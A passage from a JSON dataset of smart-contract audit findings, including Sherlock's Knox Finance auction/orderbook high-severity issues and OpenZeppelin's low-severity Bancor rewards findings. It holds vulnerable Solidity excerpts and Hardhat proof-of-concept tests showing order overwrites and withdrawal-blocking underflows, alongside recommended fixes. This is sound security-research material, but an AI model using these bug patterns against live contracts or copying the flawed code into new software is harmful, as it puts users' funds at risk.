      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/153 \n\n## Found by \nArbitraryExecution\n\nIn the function AuctionInternal._previewWithdraw, the number type(int128).max is used as a sentinel value for deciding whether the auction is canceled. However, an order for all contracts at a price of type(int128).max passes all requires checks for limit orders.\n\nIf such an order is placed at the start of the auction, the auction can be finalized and the trader will be refunded the entire amount when the auction is processed or canceled. This effectively prevents the auction from taking place.\n\n#### Recommendation\n\nUse AuctionStorage.Status instead of sentinel values for determining whether the auction is in the canceled state.",
      "summary": "\nThis bug report concerns the function AuctionInternal._previewWithdraw in the Auction contract. It was found by ArbitraryExecution and it states that if an order is placed at the start of the auction with a price of type(int128).max, the auction can be finalized and the trader will be refunded the entire amount when the auction is processed or canceled. This prevents the auction from taking place. The recommendation is to use AuctionStorage.Status instead of sentinel values for determining whether the auction is in the canceled state.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/153",
      "tags": [],
      "finders": [
        "ArbitraryExecution"
      ]
    },
    {
      "id": "3387",
      "title": "H-4: Wrong implementation of orderbook can make user can't get their fund back",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/66 \n\n## Found by \nTrumpero\n\n## Lines of code \nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L240\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L182-L190\n\n## Summary\nWhen a user remove an order, next user call `addLimitOrder` can override the latest order with his/her order. It will make one who is owner of that latest order lose their fund. \n\n## Vulnerability Detail\nFunction `_remove` will decrease value of `index.length` by 1 when an order is removed\n```solidity=\n// url = https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L240\nfunction _remove(Index storage index, uint256 id) internal returns (bool) {\n    index.length = index.length > 0 ? index.length - 1 : 1;\n    ...\n}\n```\nInstead of reserving `id` of removed order to reuse for next created order, function `_insert` use the id of new order is `index.length + 1`\n```solidity=\n// url = https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L165-L172\nfunction _insert(\n    Index storage index,\n    int128 price64x64,\n    uint256 size,\n    address buyer\n) internal returns (uint256) {\n    index.length = index.length > 0 ? index.length + 1 : 1;\n    uint256 id = index.length;\n    ...\n}\n```\nIt will override the latest order with new order's data.\n\nFor example\n* Alice create an order with price = 10 --> `id = 1, index.length = 1`\n* Bob create an order with price = 20 --> `id = 2, index.length = 2` \n* Alice cancel order `id = 1` --> `index.length = 1`\n* Candice create new order with price = 30 \n    * At this time, new order will have `id = index.length + 1 = 1 + 1 = 2`. It will override the state of Bob's order: price from 20 -> 30 \n\n## Impact\nUser whose order is overrided can't withdraw their refund `ERC20` and their exercised tokens. \n\n## Code Snippet\n```typescript=\nit.only(\"bug\", async() => {\n    const totalContracts = await auction.getTotalContracts(epoch);\n\n    const buyer1OrderSize = totalContracts.div(5);\n    const buyer2OrderSize = totalContracts.div(5);\n    const buyer3OrderSize = totalContracts.div(5);\n\n    // buyer1 create order with price = 10\n    await asset\n      .connect(signers.buyer1)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction.addLimitOrder(epoch, 10, buyer1OrderSize);\n\n    // buyer2 create order with price = 20\n    await asset \n      .connect(signers.buyer2)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction\n      .connect(signers.buyer2)\n      .addLimitOrder(epoch, 20, buyer2OrderSize);\n\n    // order with id = 2 have price = 20 \n    expect( (await auction.getOrderById(epoch, 2)).price64x64 ).to.equal(20);\n\n    // buyer1 cancel order with id = 1\n    await auction.connect(signers.buyer1).cancelLimitOrder(epoch, 1);\n\n    // buyer3 create order with price = 30\n    await asset\n      .connect(signers.buyer3)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction\n      .connect(signers.buyer3)\n      .addLimitOrder(epoch, 30, buyer3OrderSize);\n\n    // order with id = 2 have price = 30 --> nervous \n    expect( (await auction.getOrderById(epoch, 2)).price64x64 ).to.equal(30);\n});\n```\nTo check with test, u can use this file \nhttps://gist.github.com/Trumpero/adbcd84c33f71856dbf379f581e8abbb\nI write one more describe `::Bug` beside your original describe `::Auction` in file `Auction.behavior.ts` (just too lazy to write a new one). \n\n## Tool used\nHardhat \n\n## Recommendation\nUse an array to store unused (removed) id, then assign each id to the new limit order created instead of using `index.length`.",
      "summary": "\nThis bug report is about an issue found in the OrderBook.sol file of the sherlock-audit/2022-09-knox-judging repository on GitHub. The issue was found by Trumpero and is labeled as Issue H-4. It states that when a user removes an order, the next user to call the addLimitOrder function can override the latest order with their own order, which can cause the owner of the latest order to lose their funds. \n\nThe code snippet provided in the report explains how the vulnerability works. It starts with Alice creating an order with a price of 10, Bob creating an order with a price of 20, and Alice canceling her order. Then, Candice creates a new order with a price of 30. The new order will have an id of 2, which is the same as Bob's order. This will override Bob's order, causing him to lose his funds.\n\nThe report also includes a tool used to test the vulnerability, which is Hardhat. The recommendation given is to use an array to store unused (removed) id, and assign each id to the new limit order created instead of using index.length. This will ensure that no orders are overridden and users will not lose their funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/66",
      "tags": [
        "Array Reorder",
        "Array",
        "Business Logic"
      ],
      "finders": [
        "Trumpero"
      ]
    },
    {
      "id": "3386",
      "title": "H-3: Auction can potentially sell more contracts than it has collateral for.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/80 \n\n## Found by \nhansfriese, yixxas\n\n## Summary\n`auction.totalContracts` is determined by the amount of collateral the protocol has received. After an auction has ended, users are allowed to withdraw and what they receive depends on whether their orders have filled, or they receive a refund, or a mixture of both. However, wrong accounting in `_previewWithdraw()` can lead to the `fill` and `refund` value to be calculated wrongly.\n\n## Vulnerability Detail\nEach time a withdrawal is made, the order is removed from the order book as seen in L339 in `_previewWithdraw()`. Now, the issue here is in the line `totalContractsSold += data.size`. If a user with an order that is higher priced, that is with a lower index in the order book( since order book is in decreasing order based on price ), chooses to withdraw first, their order is removed from the order book. Now, the next user who does a withdraw will call this same function, but `totalContractsSold` is calculated from 0 again. This leads to problems and I illustrate with a simple example below.\n\n\nAssume,\n`auction.totalContracts = 10`\n\nAlice first `addLimitOrder()` with `price = 10`, `size = 10`.\nBob then `addLimitOrder()` with `price = 10`, 'size = 1'.\n\nNow order book have 2 orders.\n\n`processOrder()` is then called, since utilisation reaches a 100%, clearing price is set to 10 and all contracts are sold to Alice.\nNow, Alice does a withdraw first and withdraws successfully with `fill = 10, refund = 0`. Now Bob tries to withdraw, the previous order is removed from the order book, so when `i = 1`, it enters the `if (data.price64x64 >= lastPrice64x64)` check. This time, `if (totalContractsSold + data.size >= auction.totalContracts)` check does not pass since `totalContractsSold = 0, data.size = 1, auction.totalContracts = 10`. It will then enter the else part where `fill += data.size`. This means that additional contracts are being sold to Bob even though it has been previously sold to Alice which exceeds the limit that the collateral allows.\n\n## Impact\nAuction is selling more contracts than it has collateral for which creates plenty of liquidity problems / issues with risk as options are now \"naked\".\n\n## Code Snippet\n\n[AuctionInternal.sol#L279-L347](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L279-L347)\n```solidity\n    function _previewWithdraw(\n        AuctionStorage.Layout storage l,\n        bool isPreview,\n        uint64 epoch,\n        address buyer\n    ) private returns (uint256, uint256) {\n        ...\n        uint256 totalContractsSold;\n        ...\n        // traverse the order book and return orders placed by the buyer\n        for (uint256 i = 1; i <= length; i++) {\n            OrderBook.Data memory data = orderbook._getOrderById(next);\n            next = orderbook._getNextOrder(next);\n\n            if (data.buyer == buyer) {\n                if (\n                    lastPrice64x64 < type(int128).max &&\n                    data.price64x64 >= lastPrice64x64\n                ) {\n                    // if the auction has not been cancelled, and the order price is greater than or\n                    // equal to the last price, fill the order and calculate the refund amount\n                    uint256 paid = data.price64x64.mulu(data.size);\n                    uint256 cost = lastPrice64x64.mulu(data.size);\n\n                    if (\n                        totalContractsSold + data.size >= auction.totalContracts\n                    ) {\n                        // if part of the current order exceeds the total contracts available, partially\n                        // fill the order, and refund the remainder\n                        uint256 remainder =\n                            auction.totalContracts - totalContractsSold;\n\n                        cost = lastPrice64x64.mulu(remainder);\n                        fill += remainder;\n                    } else {\n                        // otherwise, fill the entire order\n                        fill += data.size;\n                    }\n\n                    // the refund takes the difference between the amount paid and the \"true\" cost of\n                    // of the order. the \"true\" cost can be calculated when the clearing price has been\n                    // set.\n                    refund += paid - cost;\n                } else {\n                    // if last price >= type(int128).max, auction has been cancelled, only send refund\n                    // if price < last price, the bid is too low, only send refund\n                    refund += data.price64x64.mulu(data.size);\n                }\n\n                if (!isPreview) {\n                    // when a withdrawal is made, remove the order from the order book\n                    orderbook._remove(data.id);\n                }\n            }\n\n            totalContractsSold += data.size;\n        }\n\n        return (refund, fill);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThis problem arises due to how orders that have the same price as the clearing price, yet should not be filled due to exceeding the limit is not accounted for. A check in `_previewWithdraw()` needs to be done to prevent this edge case.\n\nI believe removing an order from the order book after withdrawal is done to prevent multiple withdrawals from the same user. If this is the case, we can use a mapping to check this instead, so that `totalContractsSold` remains accurate. We can then refund users once this exceeds `auction.totalContracts`.",
      "summary": "\nThis bug report is about an issue in the Auction contract of the Sherlock Audit project. The issue is that the contract can potentially sell more contracts than it has collateral for. This is because when a withdrawal is made, the order is removed from the order book which can lead to wrong accounting in `_previewWithdraw()` and `fill` and `refund` value to be calculated wrongly. \n\nThis is illustrated by an example of Alice and Bob, where Alice first adds a limit order with a price of 10 and size of 10, and Bob then adds a limit order with a price of 10 and size of 1. After `processOrder()` is called, clearing price is set to 10 and all contracts are sold to Alice. Now, when Alice does a withdraw first and withdraws successfully with `fill = 10, refund = 0`, Bob tries to withdraw. Since Alice's order is removed from the order book, `totalContractsSold` is calculated from 0 again. This leads to Bob receiving additional contracts even though it has been previously sold to Alice which exceeds the limit that the collateral allows. \n\nThe impact of this is that Auction is selling more contracts than it has collateral for which creates plenty of liquidity problems / issues with risk as options are now \"naked\". The code snippet and recommendation provided is to add a check in `_previewWithdraw()` to prevent this edge case, and to use a mapping to check multiple withdrawals from the same user. The tool used for finding this issue is Manual Review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/80",
      "tags": [],
      "finders": [
        "hansfriese",
        "yixxas"
      ]
    },
    {
      "id": "3385",
      "title": "H-2: [NAZ-M6] Unbounded loop in `_previewWithdraw() && _redeemMax()` Can Lead To DoS",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/102 \n\n## Found by \n\\_\\_141345\\_\\_, 0xNazgul, ctf\\_sec\n\n## Summary\nThere are some unbounded loops that can lead to DoS.\n\n## Vulnerability Detail\nThe loop inside of `_previewWithdraw()` goes through all orders in `orderbook` and checks if the `data.buyer` is the `buyer` passed in parameter. It does some checks, math and an external call to remove the `data.id` from the orderbook. With all of this happening in the loop and costing gas it may revert due to exceeding the block size gas limit. This is the same case for `_redeemMax()` but has more gas costly executions with `transfer()` being involved.\n\n## Impact\nThere are over thousands of orders that the loop has to go through, along with the massive amount of orders that are the `buyer`s. Half way through the execution fails due to exceeding the block size gas limit.\n\n## Code Snippet\n[`AuctionInternal.sol#L298`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L298), [`QueueInternal.sol#L140`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/queue/QueueInternal.sol#L140)\n\n## Tool used\nManual Review\n\n## Recommendation\nConsider avoiding all the actions executed in a single transaction, especially when calls are executed as part of a loop.\n\n## Discussion\n\n**0xCourtney**\n\nIt might make sense to treat `redeemMax` as a separate issue since it's in a different contract and therefore relies on a different mechanism than the other functions mentioned. `redeemMax` implements a for-loop that iterates through all of the tokenId's held by an account. These tokenId's accumulate whenever a user deposits collateral into the queue during different epochs. The `redeemMax` function is called every time a user deposits, into the Queue or withdraws from the Vault. This makes it impossible to accumulate more than one new tokenId at a time.\n\nThis applies specifically to issues #15, and #102.\n\n**Evert0x**\n\n@0xCourtney would you consider 15 / 102 a different severity than the others? Based on your comment I assume this issue related to `redeemMax` is invalid but the others (24, 25, 82, 85) are valid. Is that correct?\n\n**0xCourtney**\n\n#25 is actually incorrect. We do check that size > minSize for the auction orders for [`_validateLimitOrder`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L485) and [`_validateMarketOrder`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L506)\n#102 should be two separate issues, one for `previewWithdraw` another for `redeemMax`. The issue mentioned about `redeemMax` should be low or informational for the reasons stated above.\n#15 likewise should be low or informational as its related to `redeemMax`\n#24, #82, and #85 are issues we plan to fix.\n\n**Evert0x**\n\nFor #25 `minSize` is set in the `AuctionProxy` constructor but no `> 0` check is done, but we consider that a low issue.\n\n**Evert0x**\n\nJust for confirmation I kept #102 the main issue, although it's referencing two separate issues. #24, #82 and #85 are duplicates of this. Rest of the issues are low/invalid",
      "summary": "\nThis bug report is about an unbounded loop in the functions `_previewWithdraw()` and `_redeemMax()` in the Knox contract that could lead to a denial of service (DoS). The loops go through all orders in the orderbook and do some checks, math, and an external call. This can cause the transaction to exceed the block size gas limit and fail. There are thousands of orders that the loop has to go through, and the problem could happen halfway through the execution. The code snippets for the functions are located in `AuctionInternal.sol#L298` and `QueueInternal.sol#L140`.\n\nThe bug was found by \\_\\_141345\\_\\_, 0xNazgul, and ctf\\_sec during a manual review. The recommendation is to avoid all the actions executed in a single transaction, especially when calls are executed as part of a loop.\n\nThe discussion about the bug focused on the issue #102 and the related issues #15 and #25. Issue #15 and #25 were considered low or informational, while issue #102 is the main issue and the other issues (#24, #82, and #85) are duplicates. For issue #25, a `minSize` is set in the `AuctionProxy` constructor but no `> 0` check is done.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/102",
      "tags": [],
      "finders": [
        "0xNazgul",
        "\\_\\_141345\\_\\_",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3384",
      "title": "H-1: Underflow in ```_previewWithdraw``` could prevent withdrawals",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/106 \n\n## Found by \ndipp, \\_\\_141345\\_\\_, Trumpero, 0x52, hansfriese, yixxas\n\n## Summary\n\nAn underflow in the ```_previewWithdraw``` function in ```AuctionInternal.sol``` due to totalContractsSold exceeding auction.totalContracts could prevent users from withdrawing options.\n\n## Vulnerability Detail\n\nThe ```_previewWithdraw``` function returns the fill and refund amounts for a buyer by looping over all orders. A totalContractsSold variable is used to track the amount of contracts sold as the loop iterates over all orders. If the current order's size + totalContractsSold exceeds the auction's totalContracts then the order will only be filled partially. The calculation for the partial fill (remainder) is given on [line 318](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L318). This will lead to an underflow if totalContractsSold > the auction's totalContracts which would happen if there are multiple orders that cause the totalContractsSold variable to exceed totalContracts.\n\nThe totalContractsSold variable in ```_previewWithdraw``` could exceed the auction.totalContracts due to the contracts sold before the start of an auction through limit orders not being limited. When an order is added, _finalizeAuction is only called if the auction has started. The ```_finalizeAuction``` function will call the ```_processOrders``` function which will return true if the auction has reached 100% utilization. Since limit orders can be made before the start of an auction, _finalizeAuction is not called and any amount of new orders may be made.\n\nExample: The buyer makes a limit order with size > auction.totalContracts. They then make another order with size of anything. These orders are made before the start of the auction so ```_processOrders``` is not called for every new order and totalContractsSold can exceed totalContracts. When ```_previewWithdraw``` is called, after the buyer's first order is processed, totalContractsSold > auction.totalContracts so the condition on [line 313](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L313) passes. Since totalContractsSold > auction.totalContracts the calculation on [line 318](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L318) underflows and the transaction reverts. The ```_previewWithdraw``` function and thus the ```_withdraw``` function is uncallable.\n\nTest code added to ```Auction.behaviour.ts```, under the ```#addLimitOrder(uint64,int128,uint256)``` section:\n\n```typescript\n\tit(\"previewWithdraw reverts if buyer has too many contracts\", async () => {\n          assert.isEmpty(await auction.getEpochsByBuyer(addresses.buyer1));\n\n          await asset\n            .connect(signers.buyer1)\n            .approve(addresses.auction, ethers.constants.MaxUint256);\n\n          const totalContracts = await auction.getTotalContracts(epoch);\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.mul(2)\n          );\n\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.div(2)\n          );\n\n          const epochByBuyer = await auction.getEpochsByBuyer(addresses.buyer1);\n\n          assert.equal(epochByBuyer.length, 1);\n          assert.bnEqual(epochByBuyer[0], epoch);\n          \n          await expect(auction.callStatic[\n            \"previewWithdraw(uint64)\"\n          ](epoch)).to.be.reverted;\n        });\n```\n\nThe test code above shows a buyer is able to add an order with size auction.totalContracts*2 and a subsequent order with size auction.totalContracts/2. The ```previewWithdraw``` function reverts when called. \n\n## Impact\n\nUsers would be unable to withdraw from the Auction contract.\n\n## Code Snippet\n\n[AuctionInternal.sol:_previewWithdraw#L312-L321](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L312-L321)\n```solidity\n                    if (\n                        totalContractsSold + data.size >= auction.totalContracts\n                    ) {\n                        // if part of the current order exceeds the total contracts available, partially\n                        // fill the order, and refund the remainder\n                        uint256 remainder =\n                            auction.totalContracts - totalContractsSold;\n\n                        cost = lastPrice64x64.mulu(remainder);\n                        fill += remainder;\n```\n[AuctionInternal.sol:_validateLimitOrder#L479-L489](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L479-L489)\n```solidity\n    function _validateLimitOrder(\n        AuctionStorage.Layout storage l,\n        int128 price64x64,\n        uint256 size\n    ) internal view returns (uint256) {\n        require(price64x64 > 0, \"price <= 0\");\n        require(size >= l.minSize, \"size < minimum\");\n\n        uint256 cost = price64x64.mulu(size);\n        return cost;\n    }\n```\n\n[AuctionInternal.sol:_addOrder#L545-L562](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L545-L562)\n```solidity\n    function _addOrder(\n        AuctionStorage.Layout storage l,\n        AuctionStorage.Auction storage auction,\n        uint64 epoch,\n        int128 price64x64,\n        uint256 size,\n        bool isLimitOrder\n    ) internal {\n        l.epochsByBuyer[msg.sender].add(epoch);\n\n        uint256 id = l.orderbooks[epoch]._insert(price64x64, size, msg.sender);\n\n        if (block.timestamp >= auction.startTime) {\n            _finalizeAuction(l, auction, epoch);\n        }\n\n        emit OrderAdded(epoch, id, msg.sender, price64x64, size, isLimitOrder);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe loop in ```_previewWithdraw``` should check if the current totalContractsSold is >= totalContracts. If it is then the remainder should be set to 0 which would allow the current order to be fully refunded.\n\nAdditionally, the orders for an auction should be checked before the auction starts. In ```_addOrder```, consider adding a condition that will call ```_processOrders``` if the auction has not started yet. If ```_processOrders``` returns true then do not allow the order to be added. Or just allow the auction to be finalized before it starts if the total contracts sold has reached the auction's totalContracts.",
      "summary": "\nThis bug report is about an underflow in the ```_previewWithdraw``` function in the ```AuctionInternal.sol``` file. The bug occurs when the totalContractsSold variable exceeds the auction's totalContracts. This can happen when multiple orders are made before the start of an auction and the ```_processOrders``` function is not called for every new order. This leads to the calculation for the partial fill (remainder) on line 318 underflowing and the transaction reverting. As a result, users would be unable to withdraw from the Auction contract.\n\nThe bug was found by dipp, \\_\\_141345\\_\\_, Trumpero, 0x52, hansfriese, and yixxas. The code snippets used in the report are from the ```AuctionInternal.sol``` file, lines 312-321, 479-489, and 545-562.\n\nThe recommendation to fix this bug is to add a condition to the loop in ```_previewWithdraw``` which checks if the current totalContractsSold is greater than or equal to totalContracts. If it is, then the remainder should be set to 0 which would allow the current order to be fully refunded. Additionally, the orders for an auction should be checked before the auction starts. In ```_addOrder```, consider adding a condition that will call ```_processOrders``` if the auction has not started yet. If ```_processOrders``` returns true then do not allow the order to be added. Or just allow the auction to be finalized before it starts if the total contracts sold has reached the auction's totalContracts.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/106",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "0x52",
        "yixxas",
        "Trumpero",
        "dipp",
        "hansfriese",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "10520",
      "title": "enableProgramis overloaded",
      "impact": "LOW",
      "content": "In the[`AutoCompoundingRewards`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol)contract, the[`enableProgram`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L314)function is used to enable*or disable*a program for a specific pool, depending on the bool`status`parameter. The function also emits a[`ProgramEnabled`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L328)event, even in the instance where the program is being disabled (although the event details contain the correct updated status).\n\n\nIn order to avoid unnecessary confusion and to increase the overall readability of the codebase, consider renaming the function and event to something such as`updateProgramStatus`to better reflect the actual function operation.\n\n\n**Update:***Acknowledged. Clients response:*\n\n\n\n> This was a design decision in order to prioritize ease of consumption (single event) and binary size over readability.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10519",
      "title": "Lack of event emissions after updating state",
      "impact": "LOW",
      "content": "The following functions do not emit relevant events despite executing state-altering actions:\n\n\n* No event is emitted when the[`_autoProcessRewardsCount`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L79)variable is first set[during contract initialization](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L169). This is inconsistent with the fact that an event*is*emitted when the same value is updated via the[`setAutoProcessRewardsCount`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L223)function.\n* There is no event emitted when`_autoProcessRewardsIndex`is updated despite the fact that this value influences the behavior of the`external`[`autoProcessRewards`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L334)function.\n\n\nIn order to facilitate tracking and to notify off-chain clients following the contracts activity, consider emitting events whenever state-changing operations take place.\n\n\n**Update:***Partially addressed in commit[`5f223b2ff0f1f9fcdd92d89bc2e420c9d984cb5c`](https://github.com/bancorprotocol/contracts-v3/commit/5f223b2ff0f1f9fcdd92d89bc2e420c9d984cb5c). An event including the new value of`_autoProcessRewardCount`is now emitted during contract construction. However, the client considers`_autoProcessRewardsIndex`an non-public implementation detail which should not emit events upon alteration, despite its role in facilitating monitoring.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10518",
      "title": "uint32times can overflow in the future",
      "impact": "LOW",
      "content": "Throughout the[`AutoCompoundingRewards`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol)contract, all program start, end, and elapsed times are encoded as`uint32`values. In the year 2106, this will be problematic in two ways.\n\n\n1. Near the time when unix timestamps will begin to overflow the`uint32`type, it will become difficult to create flat programs ending after the unix timestamp overflow event. Specifically, it will not be possible to call`createFlatProgram`with an`endTime`that overflows the`uint32`type because[it will appear to be less than the`startTime`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L262). This will be a temporary inconvenience, because once the current time overflows the`uint32`type it will be possible to create new flat programs as normal again.\n2. The`createExpDecayProgram`does not expect an`endTime`input. Instead, a`halfLife`input parameter is specified. This will make it possible to call`createExpDecayProgram`even around the time that unix time will overflow the`uint32`type. However, if a program is created before the overflow time, then after the overflow time, even if it should be a valid program,[it would be treated as inactive](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L370)and no rewards from the program could be processed. This, in turn, would prevent both`processRewards`and`autoProcessRewards`from processing rewards for that program. This would be more problematic and tight packing of the stored programs could make an update to remedy the situation more difficult.\n\n\nConsider either increasing the bits available to store and evaluating timestamps to something larger than`uint32`or adding a warning to the protocol documentation to upgrade the contract well before the overflow time will be reached.\n\n\n**Update:***Acknowledged. Clients response:*\n\n\n\n> The contracts are expected to change and evolve and new versions implemented way before the timestamps can overflow (at 2106).\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10517",
      "title": "Duplicated code",
      "impact": "LOW",
      "content": "The internal logic of the`poolTokenAmountToBurn`functions in the[`BNTPool`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/pools/BNTPool.sol#L294-L308)and[`PoolCollection`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/pools/PoolCollection.sol#L431-L451)contracts are essentially duplicates.\n\n\nDuplicating code can lead to issues later in the development lifecycle and leaves the project more prone to the introduction of errors. Such errors can inadvertently be introduced when functionality changes are not replicated across all instances of code that should be identical.\n\n\nRather than duplicating code, consider having just one contract or library containing the duplicated code and using it whenever the duplicated functionality is required.\n\n\n**Update:***Acknowledged. The flexibility of independent upgrades is prioritized over re-use in this case. Clients response:*\n\n\n\n> *If the contracts are used for a while and the shared logic is kept in place without frequent changes, a shared logic component will be created, but for now flexibility is more important than code reusability, especially since these two contracts are very different conceptually.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10516",
      "title": "Unbounded number of programs could result in errors",
      "impact": "LOW",
      "content": "The[`programs`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L191)function loops over a potentially unbounded list of programs/pools.\n\n\nRelatedly, the[`pools`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L205)function requires that all stored values associated with stored pools are first loaded into memory for the call to complete.\n\n\nIn either case, if too many programs are added to the protocol, these functions will run out of gas.\n\n\nAlthough neither of these functions are used internally, should the number of programs grow too large, they could be problematic for external contracts that might rely on them.\n\n\nConsider either adding a pagination mechanism to limit the number of stored values that must be loaded or adding some warning to the documentation about the need to keep the number of programs bounded to some safe level to avoid issues with these functions.\n\n\n**Update:***Acknowledged. The client conveyed that simplicity of the external interface was an intentional design choice. If future on-chain usage becomes relevant the respective contract will be upgraded.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10515",
      "title": "Lack of validation",
      "impact": "MEDIUM",
